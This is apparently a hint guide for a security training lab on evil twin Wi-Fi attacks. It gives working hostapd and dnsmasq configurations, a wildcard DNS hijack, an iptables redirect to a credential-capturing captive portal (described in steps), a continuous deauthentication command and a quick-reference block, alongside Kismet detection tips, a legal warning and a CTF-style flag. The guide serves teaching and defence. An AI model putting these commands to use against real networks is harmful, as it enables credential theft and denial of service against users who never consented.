# Lab 07: Evil Twin Attacks - Hints

Progressive hints to help you complete the lab without giving away the full solution.

```
+===============================================================+
|                        HINT GUIDE                              |
+===============================================================+
|  Start with Hint Level 1. Only proceed if still stuck.        |
|  Challenge yourself - learning happens through struggle!       |
+===============================================================+
```

## Legal Reminder

```
+=====================================================================+
|                    CRITICAL LEGAL WARNING                            |
+=====================================================================+
|  Evil twin attacks are ILLEGAL without full authorization.          |
|  Only perform in YOUR OWN ISOLATED lab environment.                 |
|  Never create rogue APs that could affect other users.              |
+=====================================================================+
```

---

## Exercise 1: Basic Evil Twin

### Task
Create an evil twin access point that mimics your test network.

### Hint Level 1 - Conceptual
An evil twin is a rogue access point with the same SSID as a legitimate network. Clients may connect to it, especially if it has a stronger signal.

### Hint Level 2 - Components Needed
You need three things:
1. A way to create an access point (hostapd)
2. A way to assign IP addresses to clients (dnsmasq)
3. Network configuration (IP address, forwarding)

### Hint Level 3 - Order of Operations
1. Configure network interface with static IP
2. Create hostapd configuration
3. Create dnsmasq configuration
4. Enable IP forwarding
5. Start services

### Hint Level 4 - Key Configuration
```bash
# Interface setup
sudo ip addr add 192.168.1.1/24 dev wlan0

# hostapd needs: interface, ssid, channel
# dnsmasq needs: interface, dhcp-range
```

### Hint Level 5 - Starting Services
```bash
# Start DHCP/DNS
sudo dnsmasq -C /etc/dnsmasq-evil.conf

# Start AP
sudo hostapd /etc/hostapd/evil-twin.conf
```

---

## Exercise 2: Captive Portal

### Task
Create a captive portal that captures credentials.

### Hint Level 1 - Conceptual
A captive portal redirects all web traffic to a login page. Credentials entered are captured by the attacker.

### Hint Level 2 - Components
1. Web server (Apache/Nginx)
2. Login page (HTML)
3. Credential capture script (PHP)
4. DNS/redirect configuration

### Hint Level 3 - Traffic Redirection
All DNS queries need to resolve to your IP address. dnsmasq can do this:
```ini
address=/#/192.168.1.1
```

### Hint Level 4 - HTTP Redirect
Use iptables to redirect HTTP traffic:
```bash
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
```

### Hint Level 5 - Credential Logging
PHP script should:
1. Get POST data ($_POST['email'], $_POST['password'])
2. Write to log file
3. Redirect user to success page

---

## Exercise 3: Combined Attack

### Task
Use deauthentication to force clients onto your evil twin.

### Hint Level 1 - Conceptual
Deauth attacks disconnect clients from the legitimate AP. When they reconnect, they may choose your evil twin (especially if stronger signal).

### Hint Level 2 - Two Adapters
You need:
- One adapter for evil twin (AP mode)
- One adapter for deauth (monitor mode + injection)

### Hint Level 3 - Simultaneous Operation
1. Evil twin runs on wlan0
2. Deauth attacks run on wlan1mon
3. Both must operate simultaneously

### Hint Level 4 - Deauth Command
```bash
sudo aireplay-ng -0 0 -a [REAL_AP_BSSID] wlan1mon
```

### Hint Level 5 - Success Indicators
- Clients disconnect from real AP (visible in airodump-ng)
- Clients connect to your evil twin (visible in hostapd output)

---

## Exercise 4: Detection

### Task
Learn how to detect evil twin attacks.

### Hint Level 1 - Visual Clues
Multiple networks with same SSID is suspicious. Check encryption type - if your network is WPA2 but you see an open version, it's likely fake.

### Hint Level 2 - Monitoring Tools
Use airodump-ng or Kismet to see all APs with same SSID. Compare BSSIDs - legitimate AP should have consistent MAC.

### Hint Level 3 - Signal Analysis
Evil twin often has unusually strong signal (attacker is nearby). Legitimate AP signal should be consistent from known location.

### Hint Level 4 - Kismet Alerts
Kismet automatically detects:
- APSPOOF (duplicate SSIDs)
- DEAUTHFLOOD (deauth attacks)
```bash
sudo kismet -c wlan0mon
```

---

## Troubleshooting Hints

### "hostapd won't start"

**Hint 1:** Check if interface is available:
```bash
iwconfig
```

**Hint 2:** NetworkManager may be holding the interface:
```bash
sudo systemctl stop NetworkManager
```

**Hint 3:** Check hostapd configuration for typos:
```bash
sudo hostapd -d /etc/hostapd/evil-twin.conf
# -d enables debug mode
```

### "Clients can't get IP address"

**Hint 1:** Is dnsmasq running?
```bash
ps aux | grep dnsmasq
```

**Hint 2:** Check dnsmasq log for errors:
```bash
tail -f /var/log/syslog | grep dnsmasq
```

**Hint 3:** Verify interface configuration:
```bash
ip addr show wlan0
# Should have 192.168.1.1/24
```

### "Captive portal not appearing"

**Hint 1:** Check iptables rules:
```bash
sudo iptables -t nat -L
```

**Hint 2:** Verify DNS redirection in dnsmasq config

**Hint 3:** Check Apache is running:
```bash
sudo systemctl status apache2
```

### "Clients prefer real AP"

**Hint 1:** Your evil twin needs stronger signal than legitimate AP.

**Hint 2:** Move closer to target clients.

**Hint 3:** Use deauth to disconnect clients from real AP.

---

## Quick Reference

```bash
# Interface setup
sudo ip link set wlan0 down
sudo ip addr add 192.168.1.1/24 dev wlan0
sudo ip link set wlan0 up

# Enable forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Start services
sudo dnsmasq -C /etc/dnsmasq-evil.conf
sudo hostapd /etc/hostapd/evil-twin.conf

# Captive portal redirect
sudo iptables -t nat -A PREROUTING -i wlan0 -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80

# Deauth (second adapter)
sudo airmon-ng start wlan1
sudo aireplay-ng -0 0 -a [AP_BSSID] wlan1mon

# Cleanup
sudo pkill hostapd
sudo pkill dnsmasq
sudo iptables -F
sudo iptables -t nat -F
sudo systemctl start NetworkManager
```

---

## Configuration Templates

### hostapd.conf (Minimal)
```ini
interface=wlan0
driver=nl80211
ssid=TestNetwork
hw_mode=g
channel=6
wpa=0
```

### dnsmasq.conf (Minimal)
```ini
interface=wlan0
bind-interfaces
dhcp-range=192.168.1.10,192.168.1.50,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
address=/#/192.168.1.1
```

---

## Still Stuck?

1. **Check adapter compatibility:** Does it support AP mode?
2. **Verify isolation:** No interference from other networks?
3. **Review configurations:** Any typos?
4. **Consult walkthrough:** walkthrough.md has complete solutions

---

**Flag Location:** Complete the exercises to earn: `FLAG{3v1l_tw1n_pwn3d}`
